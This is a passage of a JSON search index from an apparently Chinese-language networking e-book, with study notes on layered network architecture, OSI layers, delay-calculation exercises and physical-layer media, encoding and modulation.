</ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_13","title":"\u6570\u636e\u94fe\u8def\u5c42","text":"<p>\u89e3\u51b3\u4e00\u4e2a\u5206\u7ec4\u5728\u4e00\u4e2a\u7f51\u7edc\u6216\u4e00\u6bb5\u94fe\u8def\u4e0a\u4f20\u8f93\u7684\u95ee\u9898</p> <ul> <li>\u5982\u4f55\u6807\u8bc6\u7f51\u7edc\u4e2d\u7684\u4e0d\u540c\u4e3b\u673a\uff08\u4e3b\u673a\u7f16\u7801\uff0cMAC \u5730\u5740\uff09\u53d1\u9001\u6570\u636e\u9700\u8981\u52a0\u4e0a\u76ee\u6807\u5730\u5740\u548c\u81ea\u8eab\u5730\u5740</li> <li>\u5982\u4f55\u4ece\u4fe1\u53f7\u4e2d\u533a\u5206\u5730\u5740\u548c\u6570\u636e\uff08\u5206\u7ec4\u7684\u683c\u5f0f\u5c01\u88c5\uff09</li> <li>\u5982\u4f55\u5904\u7406\u6570\u636e\u78b0\u649e\uff08\u4e24\u4e2a\u8ba1\u7b97\u673a\u540c\u65f6\u53d1\u9001\u6570\u636e\uff0c\u4f46\u662f\u7f51\u7ebf\u662f\u5355\u5411\u7684\uff09</li> <li>\u534f\u8c03\u5404\u4e3b\u673a\u4e89\u7528\u7f51\u7ebf\uff08\u540c\u4e00\u4e2a\u7535\u8111\u4e0a\u6709\u591a\u4e2a APP\uff0c\u90fd\u4f1a\u4f7f\u7528\u7f51\u7edc\uff0c\u9700\u8981\u534f\u8c03\u4e3b\u673a\u5360\u7528\u603b\u7ebf\uff09</li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_14","title":"\u7f51\u9645\u5c42","text":"<p>\u89e3\u51b3\u5206\u7ec4\u5728\u591a\u4e2a\u7f51\u7edc\u4e0a\u4f20\u8f93\uff08\u8def\u7531\uff09\u7684\u95ee\u9898</p> <ul> <li>\u5982\u4f55\u6807\u8bc6\u5404\u7f51\u7edc\u548c\u5404\u4e3b\u673a\uff08\u7f51\u7edc\u548c\u4e3b\u673a\u5171\u7528\u7f16\u5740\u95ee\u9898\uff0c\u4f8b\u5982IP\u5730\u5740\uff09\uff1b</li> <li>\u8def\u7531\u5668\u5982\u4f55\u8f6c\u53d1\u5206\u7ec4\u7684\u95ee\u9898\uff0c\u5982\u4f55\u8fdb\u884c\u8def\u7531\u9009\u62e9\uff08\u7f51\u7edc\u4e2d\u6709\u591a\u4e2a\u7ebf\u8def\uff0c\u4e00\u4e2a\u6570\u636e\u5305\u53ef\u4ee5\u53d1\u9001\u7ed9\u4e24\u4e2a\u8def\u7531\u5668\uff0c\u90a3\u4e48\u9009\u62e9\u53d1\u9001\u7ed9\u54ea\u4e2a\uff1f\uff09</li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_15","title":"\u8fd0\u8f93\u5c42","text":"<p>\u89e3\u51b3\u8fdb\u7a0b\u4e4b\u95f4\u7ed9\u4e88\u7f51\u7edc\u7684\u901a\u4fe1\u95ee\u9898</p> <ul> <li>\u5982\u4f55\u89e3\u51b3\u8fdb\u7a0b\u4e4b\u95f4\u7684\u7f51\u7edc\u901a\u4fe1\u95ee\u9898</li> <li>\u5982\u4f55\u5904\u7406\u4f20\u8f93\u9519\u8bef</li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_16","title":"\u5e94\u7528\u5c42","text":"<p>\u901a\u8fc7\u5e94\u7528\u8fdb\u7a0b\u95f4\u7684\u4ea4\u4e92\uff0c\u5b8c\u6210\u7279\u5b9a\u7684\u7f51\u7edc\u5e94\u7528\u7684\u95ee\u9898</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#16-3","title":"1.6 \u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784\uff083\uff09\u2014\u5206\u5c42\u601d\u60f3\u4e3e\u4f8b","text":"<p>\u6d4f\u89c8\u5668\u53d1\u9001\u8bf7\u6c42\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u7684\u5b9e\u9645\u8fc7\u7a0b</p> <p>1\u3001\u5e94\u7528\u5c42\u6784\u5efa HTTP GET \u8bf7\u6c42\uff08\u8bf7\u6c42\u5934+\u8bf7\u6c42\u4f53\uff09\uff0c\u4ea4\u7ed9\u4e0b\u9762\u8fd0\u8f93\u5c42</p> <p>2\u3001\u8fd0\u8f93\u5c42\u5728\u6570\u636e\u524d\u9762\u589e\u52a0\u4e00\u4e2a TCP \u62a5\u6587\u6bb5\uff0c\u4ea4\u7ed9\u4e0b\u9762\u7f51\u9645\u5c42</p> <p>3\u3001\u7f51\u9645\u5c42\u589e\u52a0\u4e00\u4e2a IP \u6570\u636e\u62a5\uff0c\u4ea4\u7ed9\u4e0b\u9762\u7684\u6570\u636e\u94fe\u8def\u5c42</p> <p>4\u3001\u6570\u636e\u94fe\u8def\u5c42\u589e\u52a0 ETH \u8868\u793a\u6570\u636e\u7684\u5f00\u59cb\u548c\u7ed3\u675f\uff0c\u4ea4\u7ed9\u4e0b\u5c42\u7269\u7406\u5c42</p> <p>5\u3001\u7269\u7406\u5c42\u52a0\u4e00\u4e2a\u524d\u5bfc\u7801\uff0c\u8f6c\u6362\u6210\u6bd4\u7279\u6d41\u7535\u4fe1\u53f7\u53d1\u51fa\uff0c\u7ecf\u8fc7\u7f51\u7ebf\u5230\u8fbe\u8def\u7531\u5668</p> <p>6\u3001\u8def\u7531\u5668\u63a5\u6536\u540e\uff0c\u8bfb\u53d6 IP \u6570\u636e\u62a5\uff0c\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u7f51\u7edc\u4e2d</p> <p>7\u3001\u5bf9\u5e94\u7684\u8ba1\u7b97\u673a\u63a5\u6536\u5230\u6570\u636e\u5305\uff0c\u4ece\u4e0b\u5230\u4e0a\u4f9d\u6b21\u89e3\u7801\uff0c\u6700\u7ec8\u83b7\u53d6\u5230 HTTP GET \u8bf7\u6c42\u62a5\u6587</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#16-4","title":"1.6 \u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784\uff084\uff09\u2014\u4e13\u7528\u672f\u8bed","text":""},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_17","title":"\u5b9e\u4f53","text":"<p>\u5b9e\u4f53\uff1a\u4efb\u4f55\u53ef\u53d1\u9001\u6216\u63a5\u6536\u4fe1\u606f\u7684\u786c\u4ef6\u6216\u8005\u8f6f\u4ef6\u8fdb\u7a0b</p> <p>\u5bf9\u7b49\u5b9e\u4f53\uff1a\u6536\u53d1\u53cc\u65b9\u76f8\u540c\u5c42\u6b21\u4e2d\u7684\u5b9e\u4f53</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_18","title":"\u534f\u8bae","text":"<p>\u63a7\u5236\u4e24\u4e2a\u5bf9\u7b49\u5b9e\u4f53\u8fdb\u884c\u903b\u8f91\u901a\u4fe1\u7684\u89c4\u5219\u7684\u96c6\u5408\uff08\u4e0d\u540c\u5c42\u4f7f\u7528\u4e0d\u540c\u7684\u534f\u8bae\u89c4\u5219\uff09</p> <p>\u534f\u8bae\u4e09\u8981\u7d20\uff1a\u8bed\u6cd5\uff08\u5b9a\u4e49\u6240\u4ea4\u6362\u4fe1\u606f\u7684\u683c\u5f0f\uff0c\u4fe1\u606f\u7531\u54ea\u4e9b\u5b57\u6bb5\u4ee5\u53ca\u4ec0\u4e48\u987a\u5e8f\u6784\u6210\uff09\u3001\u8bed\u4e49\uff08\u5b9a\u4e49\u53cc\u65b9\u8981\u5b8c\u6210\u7684\u64cd\u4f5c\uff09\u3001\u540c\u6b65\uff08\u6536\u53d1\u53cc\u65b9\u7684\u65f6\u5e8f\u5173\u7cfb\uff0c\u4f8b\u5982HTTP\u4e09\u6b21\u63e1\u624b\u56db\u6b21\u6325\u624b\u7b49\uff09</p> <p>\u5728\u534f\u8bae\u7684\u63a7\u5236\u4e0b\uff0c\u4e24\u4e2a\u5bf9\u7b49\u5b9e\u4f53\u4ef6\u7684\u903b\u8f91\u901a\u4fe1\u4f7f\u5f97\u672c\u5c42\u80fd\u591f\u5411\u4e0a\u5c42\u63d0\u4f9b\u670d\u52a1\u3002\u5b9e\u73b0\u672c\u5c42\u534f\u8bae\uff0c\u9700\u8981\u4f7f\u7528\u4e0b\u9762\u4e00\u5c42\u6240\u63d0\u4f9b\u7684\u670d\u52a1\uff08\u4e0b\u5c42\u7ed9\u4e0a\u5c42\u63d0\u4f9b\u670d\u52a1\uff09\u3002</p> <p>\u534f\u8bae\u662f\u6c34\u5e73\u7684\uff0c\u670d\u52a1\u662f\u5782\u76f4\u7684\u3002\u5b9e\u4f53\u53ef\u4ee5\u770b\u5f97\u5230\u9999\u83f1\u4e0b\u5c42\u6240\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u8be5\u670d\u52a1\u7684\u5177\u4f53\u534f\u8bae\u3002\u4e0b\u9762\u7684\u5177\u4f53\u7ec6\u8282\u5bf9\u4e0a\u5c42\u662f\u900f\u660e\u7684\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_19","title":"\u670d\u52a1","text":"<p>\u670d\u52a1\u8bbf\u95ee\u70b9\uff1a\u540c\u4e00\u7cfb\u7edf\u4e2d\u76f8\u90bb\u4e24\u5c42\u7684\u5b9e\u4f53\u4ea4\u6362\u4fe1\u606f\u7684\u903b\u8f91\u63a5\u53e3\uff0c\u7528\u4e8e\u533a\u5206\u4e0d\u540c\u7684\u670d\u52a1\u7c7b\u578b\uff08\u4e0a\u4e0b\u4e24\u5c42\u534f\u8bae\u4ea4\u6362\u4fe1\u606f\u7684\u903b\u8f91\u63a5\u53e3\uff0cTCP \u548c HTTP \u7684\u903b\u8f91\u63a5\u53e3\uff09\u3002</p> <p>\u670d\u52a1\u539f\u8bed\uff1a\u4e0a\u5c42\u4f7f\u7528\u4e0b\u5c42\u6240\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u5fc5\u987b\u901a\u8fc7\u4e0e\u4e0b\u5c42\u4ea4\u6362\u4e00\u4e9b\u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u662f\u670d\u52a1\u539f\u8bed\u3002</p> <p>\u534f\u8bae\u6570\u636e\u5355\u5143 PDU\uff1a\u5bf9\u66fe\u5c42\u6b21\u4e4b\u95f4\u4f20\u9001\u7684\u6570\u636e\u5305\uff08\u8be5\u5c42\u7684\u534f\u8bae\u6570\u636e\u5355\u5143\uff09</p> <p>\u670d\u52a1\u6570\u636e\u5355\u5143 SDU\uff1a\u540c\u4e00\u7cfb\u7edf\u5185\uff0c\u5c42\u4e0e\u5c42\u4e4b\u95f4\u4ea4\u6362\u7684\u6570\u636e\u5305\u79f0\u4e3a\u670d\u52a1\u6570\u636e\u5355\u5143</p> <p>\u591a\u4e2a SDU \u53ef\u4ee5\u5408\u6210\u4e00\u4e2a PDU\uff0c\u4e00\u4e2a SDU \u53ef\u4ee5\u5212\u5206\u6210\u591a\u4e2a PDU\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#17-1","title":"1.7 \u7b2c1\u7ae0 \u6982\u8ff0 \u7ae0\u8282\u5c0f\u7ed3","text":"<p>\u91cd\u70b9\uff1a\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u4f53\u7cfb\u7ed3\u6784\uff1b\u5206\u7ec4\u4ea4\u6362\uff1b\u65f6\u5ef6\u8ba1\u7b97\uff1b\u7f51\u7edc\u57fa\u672c\u6982\u5ff5</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#18-1-1","title":"1.8 \u7b2c1\u7ae0 \u6982\u8ff0 \u4e60\u9898\u8bfe\uff081\uff09\u2014 \u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u4e60\u9898","text":""},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_20","title":"\u786c\u4ef6\u7684\u6700\u9ad8\u5c42\u7ea7","text":"<ul> <li> <p>\u96c6\u7ebf\u5668 HUB \u53ea\u67091\u5c42 \u7269\u7406\u5c42</p> </li> <li> <p>\u4ea4\u6362\u673a Switch \u670912\u5c42 \u7269\u7406\u5c42+\u6570\u636e\u94fe\u8def\u5c42</p> </li> <li> <p>\u8def\u7531\u5668 Router \u6709123\u5c42 \u7269\u7406\u5c42 \u6570\u636e\u94fe\u8def\u5c42 \u7f51\u7edc\u5c42</p> </li> </ul> <p>OSI \u4e03\u5c42\u6a21\u578b\uff0c\u6bcf\u4e00\u5c42\u7684\u539f\u7406\uff0c\u5bf9\u5e94\u7684\u534f\u8bae\u7b49\u7b49</p> <p>7\u3001\u5e94\u7528\u5c42\uff1a\u89e3\u51b3\u901a\u8fc7\u5e94\u7528\u8fdb\u7a0b\u4e4b\u95f4\u7684\u4ea4\u4e92\uff0c\u6765\u5b9e\u73b0\u7279\u5b9a\u7f51\u7edc\u5e94\u7528\u7684\u95ee\u9898</p> <p>6\u3001\u8868\u793a\u5c42\uff1a\u89e3\u51b3\u901a\u4fe1\u53cc\u65b9\u4ea4\u6362\u4fe1\u606f\u7684\u8868\u793a\u95ee\u9898\uff08\u5b57\u7b26\u96c6\u7684\u8f6c\u6362\uff0c\u6570\u636e\u683c\u5f0f\u8f6c\u6362\uff09</p> <p>5\u3001\u4f1a\u8bdd\u5c42\uff1a\u89e3\u51b3\u8fdb\u7a0b\u4e4b\u95f4\u8fdb\u884c\u4f1a\u8bdd\u95ee\u9898\uff08\u4f1a\u8bdd\u7ba1\u7406\uff09</p> <p>4\u3001\u8fd0\u8f93\u5c42\uff1a\u89e3\u51b3\u8fdb\u7a0b\u4e4b\u95f4\u57fa\u4e8e\u7f51\u7edc\u7684\u901a\u4fe1\u95ee\u9898\uff08\u53ef\u9760\u6570\u636e\u4f20\u8f93\uff0c\u7aef\u5230\u7aef\u7684\u670d\u52a1\uff09</p> <p>3\u3001\u7f51\u7edc\u5c42\uff1a\u89e3\u51b3\u5206\u7ec4\u5728\u591a\u4e2a\u7f51\u7edc\u4e4b\u95f4\u4f20\u8f93\uff08\u8def\u7531\uff09\u7684\u95ee\u9898\uff08\u8def\u7531\u9009\u62e9\uff09</p> <p>2\u3001\u6570\u636e\u94fe\u8def\u5c42\uff1a\u89e3\u51b3\u5206\u7ec4\u5728\u4e00\u4e2a\u7f51\u7edc\uff08\u94fe\u8def\uff09\u4e0a\u4f20\u8f93\u7684\u95ee\u9898\uff08\u53ef\u9760\u6570\u636e\u4f20\u8f93\uff09</p> <p>1\u3001\u7269\u7406\u5c42\uff1a\u89e3\u51b3\u4f7f\u7528\u4f55\u79cd\u4fe1\u53f7\u6765\u4f20\u8f93\u6bd4\u72790\u62161\u7684\u95ee\u9898</p> <p>\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784\u4e2d\u4e0d\u5305\u62ec\u534f\u8bae\u7684\u5185\u90e8\u5b9e\u73b0\u7ec6\u8282</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#18-1-2","title":"1.8 \u7b2c1\u7ae0 \u6982\u8ff0 \u4e60\u9898\u8bfe\uff082\uff09\u2014 \u65f6\u5ef6\u76f8\u5173\u4e60\u9898","text":"<p>\u65f6\u5ef6 = \u53d1\u9001\u65f6\u5ef6+\u4f20\u64ad\u65f6\u5ef6+\u5904\u7406\u65f6\u5ef6</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#1","title":"\u4f8b\u98981","text":"<p>\u5f53\u5206\u7ec4\u7b49\u957f\uff0c\u94fe\u8def\u7b49\u957f\uff0c\u5e26\u5bbd\u76f8\u540c\uff0c\u5ffd\u7565\u8def\u7531\u5668\u5904\u7406\u65f6\u5ef6\uff0cn\u4e2a\u5206\u7ec4\uff0cm\u6bb5\u94fe\u8def\uff0c\u603b\u65f6\u5ef6\uff1f</p> <p>\u603b\u65f6\u5ef6 = N\u4e2a\u5206\u7ec4\u53d1\u9001\u65f6\u5ef6 + 1\u4e2a\u5206\u7ec4\u53d1\u9001\u65f6\u5ef6 * \uff08m - 1\uff09+ \u4e00\u6bb5\u94fe\u8def\u7684\u4f20\u64ad\u65f6\u5ef6 * M\u3002\u56e0\u4e3a\u662fM\u6bb5\u94fe\u8def\uff0c\u90a3\u4e48\u5e94\u8be5\u6709m-1\u4e2a\u8def\u7531\u5668\uff0c\u6240\u4ee5\u8def\u7531\u5668\u5b58\u50a8\u8f6c\u53d1\u662f 1\u4e2a\u5206\u7ec4\u53d1\u9001\u65f6\u5ef6 * \uff08m - 1\uff09\uff0cm-1\u5b9e\u9645\u5c31\u662f\u8f6c\u53d1\u6b21\u6570\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#2","title":"\u4f8b\u98982","text":"<p>\u6bd4\u8f83\u7535\u8def\u4ea4\u6362\u548c\u5206\u7ec4\u4ea4\u6362</p> <p>\u62a5\u6587X,\u5e26\u5bbd\u662fB\u3002\u7535\u8def\u5efa\u7acb\u65f6\u95f4\u662fS\u3002\u5206\u7ec4\u4e2d\u6bcf\u4e00\u4e2a\u6570\u636e\u6bb5\u957f\u5ea6\u662f p\u3002\u4e00\u5171\u6709K\u4e2a\u94fe\u8def\uff0c\u4f20\u64ad\u65f6\u5ef6D</p> <p>\u7535\u8def\u4ea4\u6362 = \u5efa\u7acb\u7535\u8def\u8fde\u63a5\u65f6\u95f4 s + \u53d1\u9001\u65f6\u5ef6\uff08x/b\uff09+ \u4f20\u64ad\u65f6\u5ef6 \uff08kd\uff09= s + x/b + kd</p> <p>\u5206\u7ec4\u4ea4\u6362 = \u53d1\u9001\u65f6\u5ef6 + \u8def\u7531\u5668\u8f6c\u53d1\u65f6\u5ef6+ \u4f20\u64ad\u65f6\u5ef6 \uff08\u5c31\u662f\u4f8b\u98981\u4e2d\u7684\u516c\u5f0f\uff09</p> <p>= p/b * x/p + p/b * (k - 1) + kd</p> <p>\u8fd9\u6837\u53ef\u4ee5\u6bd4\u8f83\u5206\u7ec4\u4ea4\u6362\u548c\u7535\u8def\u4ea4\u6362\u7684\u65f6\u95f4\u4e86\uff0c\u5efa\u7acb\u4e0d\u7b49\u5f0f\u5373\u53ef\u6c42\u89e3\uff0c\u6c42\u5bfc\u53ef\u4ee5\u6c42\u6700\u503c</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/","title":"02 \u7269\u7406\u5c42","text":""},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#_1","title":"\u7b2c\u4e8c\u7ae0 \u7269\u7406\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7696  \u9605\u8bfb16\u5206\u949f</p> <p>https://www.bilibili.com/video/BV1c4411d7jb?p=14</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#21","title":"2.1 \u7269\u7406\u5c42\u7684\u57fa\u672c\u6982\u5ff5","text":"<p>\u7269\u7406\u5c42\u89e3\u51b3\u7684\u95ee\u9898\uff1a\u5982\u4f55\u5728\u8fde\u63a5\u7684\u5404\u79cd\u8ba1\u7b97\u673a\u5a92\u4f53\u4e0a\u4f20\u8f93\u6570\u636e\u6bd4\u7279\u6d41</p> <p>\u4f5c\u7528\uff1a\u7269\u7406\u5c42\u63d0\u4f9b\u6bd4\u7279\u6d41\u7684\u4f20\u8f93\u670d\u52a1\u5373\u53ef\uff08\u6570\u636e\u94fe\u8def\u5c42\u4eab\u53d7\u670d\u52a1\uff09</p> <p>\u4f20\u8f93\u5a92\u4f53\uff1a\u5bfc\u5f15\u578b\uff08\u53ef\u89c1\u7684\u7f51\u7ebf\uff0c\u53cc\u7ede\u7ebf\uff0c\u540c\u8f74\u7535\u7f06\uff09 \u6216\u8005 \u975e\u5bfc\u5f15\u578b\uff08\u65e0\u7ebf\u7f51\uff09</p> <p>\u534f\u8bae\uff1a\u673a\u68b0\u5c5e\u6027\uff08\u5f15\u811a\u7684\u987a\u5e8f\uff09\uff0c\u7535\u6c14\u5c5e\u6027\uff08\u7535\u538b\uff09\uff0c\u529f\u80fd\u5c5e\u6027\uff0c\u8fc7\u7a0b\u5c5e\u6027\uff0c\u4e86\u89e3</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#22","title":"2.2 \u7269\u7406\u5c42\u4e0b\u9762\u7684\u4f20\u8f93\u5a92\u4f53","text":"<p>\u540c\u8f74\u7535\u7f06\uff1a\u6709\u7ebf\u7535\u89c6\u7ebf\uff08\u7535\u963b\u4e0d\u540c\uff09\uff0c\u6210\u672c\u9ad8\uff0c\u4e0d\u7075\u6d3b\uff0c\u73b0\u5728\u4e0d\u7528\u4e86</p> <p>\u53cc\u7ede\u7ebf\uff1a\u65e5\u5e38\u7684\u7f51\u7ebf\uff08\u516b\u6839\uff09</p> <p>\u5149\u7f06\uff1a\u901a\u4fe1\u5bb9\u91cf\u5927\uff0c\u4f20\u8f93\u635f\u8017\u5c0f\uff0c\u6297\u7535\u78c1\u5e72\u6270\uff0c\u91cd\u91cf\u8f7b\uff1b\u7f3a\u70b9\u662f\u63a5\u53e3\u6602\u8d35\u3002\u5149\u7f06\u7684\u539f\u7406\uff1a\u5185\u90e8\u662f\u73bb\u7483\u4e1d\uff0c\u548c\u5916\u5c42\u7684\u53cd\u5c04\u7387\u4e0d\u540c\u3002\u5f53\u5165\u5c04\u89d2\u8f83\u5927\u65f6\uff0c\u5149\u5168\u53cd\u5c04\uff0c\u5b9e\u73b0\u4fe1\u53f7\u7684\u4f20\u8f93\u3002\u5165\u53e3\u548c\u51fa\u53e3\u4f7f\u7528\u53d1\u5149\u4e8c\u6781\u7ba1\u548c\u5149\u7535\u4e8c\u6781\u7ba1\u5904\u7406\uff08\u6216\u8005\u6fc0\u5149\uff09</p> <p>\u5355\u6a21\u5149\u7ea4\u548c\u591a\u6a21\u5149\u7ea4\uff1a\u591a\u6a21\u5149\u7ea4\u53d1\u5c04\u7684\u591a\u675f\u5149\uff0c\u53ef\u80fd\u5e72\u6270\uff08\u77ed\u8ddd\u79bb\u4f20\u8f93\uff09\u3002\u5355\u6a21\u53d1\u5c04\u7684\u4e00\u675f\u5149\uff0c\u53ef\u80fd\u5b58\u5728\u5e72\u6270\uff08\u8fdc\u8ddd\u79bb\u4f20\u8f93\uff09\u3002</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#23","title":"2.3 \u4f20\u8f93\u65b9\u5f0f","text":"<p>\u4e32\u884c\u4f20\u8f93\u548c\u5e76\u884c\u4f20\u8f93\uff1a\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u636e\u4f20\u8f93\uff08\u4e0d\u540cCPU\u548c\u5185\u5b58\uff09\u662f\u5e76\u884c\u4f20\u8f93\uff0c\u901a\u8fc7\u6570\u636e\u603b\u7ebf</p> <p>\u540c\u6b65\u4f20\u8f93\u548c\u5f02\u6b65\u4f20\u8f93\uff1a\u540c\u6b65\u4f20\u8f93\u662f\u6bcf\u4e2a\u5b57\u8282\u4e4b\u95f4\u76f4\u63a5\u53d1\u9001\uff0c\u5f02\u6b65\u662f\u4e0d\u540c\u5b57\u8282\u95f4\u9694\u4e0d\u4e00\u6837\u7684\u65f6\u95f4\u53d1\u9001\u3002\u9700\u8981\u8003\u8651\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u7684\u5ef6\u8fdf\u3002</p> <p>\u5355\u5411\u901a\u4fe1\u3001\u534a\u53cc\u5de5\u901a\u4fe1\u3001\u5168\u53cc\u5de5\u901a\u4fe1</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#24","title":"2.4 \u7f16\u7801\u4e0e\u8c03\u5236","text":"<p>\u7f16\u7801\uff1a\u6587\u4ef6\u548c\u591a\u5a92\u4f53\u9996\u5148\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\uff0c\u4e8c\u8fdb\u5236\u8f6c\u6362\u6210\u7535\u4fe1\u53f7\uff0c\u7535\u4fe1\u53f7\u5206\u4e3a\u6570\u5b57\u4fe1\u53f7\u548c\u6a21\u62df\u4fe1\u53f7\uff0c\u53ef\u4ee5\u5728\u6570\u5b57\u4fe1\u9053\u4e0a\u6216\u8005\u6a21\u62df\u4fe1\u9053\u4e0a\u4f20\u8f93\uff0c\u90a3\u4e48\u9700\u8981\u8fdb\u884c\u8f6c\u7801\u7f16\u7801\uff08\u7406\u8bba\u4e0a\u6570\u5b57\u4fe1\u53f7\u4e5f\u53ef\u4ee5\u5728\u6a21\u62df\u4fe1\u9053\u4e0a\u4f20\u8f93\uff09\u3002</p> <p>\u6570\u5b57\u4fe1\u53f7\u5728\u6570\u5b57\u4fe1\u9053\u4e2d\u4f20\u8f93\uff0c\u76f4\u63a5\u7f16\u7801\uff1b\u6570\u5b57\u4fe1\u53f7\u5728\u6a21\u62df\u4fe1\u9053\u4e2d\u4f20\u8f93\uff0c\u9700\u8981\u8c03\u5236\uff08\u4f8b\u5982 WiFi \u4f7f\u7528\u8865\u7801\u952e\u63a7\uff0c\u6b63\u4ea4\u9891\u5206\u7b49\u8c03\u5236\u65b9\u6cd5\uff09\u3002\u5728\u6a21\u62df\u4fe1\u9053\u4e0a\u4f20\u8f93\u90fd\u9700\u8981\u8c03\u5236\u3002</p> <p>\u7801\u5143\uff1a\u5728\u4f7f\u7528\u65f6\u95f4\u57df\u7684\u6ce2\u5f62\u8868\u793a\u6570\u5b57\u4fe1\u53f7\u65f6\uff0c\u4ee3\u8868\u4e0d\u540c\u79bb\u6563\u6570\u503c\u7684\u57fa\u672c\u6ce2\u5f62\uff08\u9891\u7387\u57df\uff09\u3002\u7b80\u5355\u7406\u89e3\uff0c\u5c31\u662f\u4e00\u4e2a\u57fa\u672c\u7684\u6ce2\u6bb5\uff08\u57fa\u51c6\u6ce2\uff09</p> <p>\u5e38\u7528\u7f16\u7801\uff1a</p> <ul> <li>\u4e0d\u5f52\u96f6\u7f16\u7801\uff08\u4f20\u9012\u4fe1\u53f7\u65f6\uff0c\u76f4\u63a5\u4ece\u4f4e\u7535\u5e73\u8df3\u5230\u9ad8\u7535\u5e73\uff09</li> <li>\u5f52\u96f6\u7f16\u7801\uff08\u5728\u4f20\u9012\u4fe1\u53f7\u65f6\uff0c\u4e5f\u9700\u8981\u4f20\u9012\u65f6\u95f4\u4fe1\u53f7\uff0c\u6bcf\u4e2a\u7801\u5143\u7ed3\u675f\u540e\u4fe1\u53f7\u90fd\u8981\u5f52\u96f6\uff0c\u63a5\u6536\u65b9\u53ea\u9700\u8981\u5728\u4fe1\u53f7\u5f52\u96f6\u540e\u91c7\u6837\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u5355\u72ec\u7684\u65f6\u949f\u4fe1\u53f7\uff0c\u4e5f\u5c31\u662f\u81ea\u540c\u6b65\uff09</li> <li>\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff08\u7801\u5143\u4e2d\u95f4\u65f6\u523b\u7684\u8df3\u53d8\uff0c\u65e2\u8868\u793a\u65f6\u949f\uff0c\u53c8\u8868\u793a\u6570\u636e\uff09\u9700\u8981\u89c4\u5b9a\uff0c\u4ece\u6b63\u7535\u5e73\u8df3\u8f6c\u5230\u8d1f\u7535\u5e73\u662f\u8868\u793a 0 \u8fd8\u662f1 \uff08\u5b9e\u9645\u9700\u8981\u7ea6\u5b9a\u662f0\u8fd8\u662f1\uff09</li> </ul> <p>\u524d\u4e24\u4e2a\u7f16\u7801\uff0c\u901a\u8fc7\u9ad8\u7535\u5e73\u4f4e\u7535\u5e73\u4f20\u8f93\u4fe1\u53f7\uff1b\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u4f7f\u7528\u7535\u5e73\u7684\u53d8\u5316\u4f20\u8f93\u4fe1\u53f7</p> <p>\u57fa\u672c\u8c03\u5236\u65b9\u6cd5\uff1a\u8c03\u5e45\uff08\u8c03\u8282\u632f\u5e45\uff09\uff1b\u8c03\u9891\uff08\u8c03\u8282\u9891\u7387\uff09\uff1b\u8c03\u76f8\uff08\u8c03\u8282\u76f8\u4f4d\uff09\u901a\u8fc7\u5e45\u5ea6\u9891\u7387\u76f8\u4f4d\u7684\u4e0d\u540c\uff0c\u8868\u793a\u6570\u5b5701\u3002</p> <p>\u901a\u5e38\u4f7f\u7528\u76f8\u4f4d\u548c\u632f\u5e45\u96c6\u5408\u8c03\u6574\uff08\u6b63\u4ea4\u632f\u5e45\u8c03\u5236 QAM\uff09\u4e00\u517112\u79cd\u76f8\u4f4d\uff0c\u6bcf\u79cd\u76f8\u4f4d\u67091-2\u79cd\u632f\u5e45\u53ef\u9009\uff0c\u53ef\u4ee5\u8c03\u523616\u4e2d\u7801\u5143\uff08\u6ce2\u5f62\uff09\uff0c\u6bcf\u4e00\u4e2a\u7801\u5143\u53ef\u4ee5\u5bf9\u5e944\u4e2a\u6bd4\u7279\u3002</p> <p>\uff08\u8fd9\u90e8\u5206\u9700\u8981\u901a\u4fe1\u539f\u7406\u57fa\u7840\u8bfe\u7a0b\uff0c\u4e0e\u7f16\u7a0b\u5173\u8054\u4e0d\u5927\uff0c\u4e86\u89e3\u5373\u53ef\uff09</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#25","title":"2.5 